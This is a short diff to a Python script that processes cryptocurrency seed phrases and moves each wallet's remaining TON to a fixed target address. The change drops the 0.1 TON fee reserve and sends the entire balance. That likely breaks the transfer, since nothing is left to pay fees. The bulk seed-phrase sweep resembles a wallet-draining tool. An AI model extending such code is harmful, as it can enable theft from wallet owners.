@@ -191,8 +191,8 @@ async def process_single_seed_phrase(seed_phrase: str) -> None:
 
             if nft_count == 0:
                 print("\nNo NFTs remaining. Sending all TON to target address...")
-                # Leave 0.1 TON for fees
-                amount_to_send = (balance / 1e9) - 0.1
+                # Send entire balance
+                amount_to_send = balance / 1e9
                 if amount_to_send > 0:
                     success = await send_ton(wallet, amount_to_send)
                     if success:
@@ -200,7 +200,7 @@ async def process_single_seed_phrase(seed_phrase: str) -> None:
                     else:
                         print("❌ Failed to send remaining TON")
                 else:
-                    print("Insufficient balance to send TON (need to leave 0.1 TON for fees)")
+                    print("No TON to send")
                 break
 
             print(f"\n=== TRANSFER SUMMARY ===")
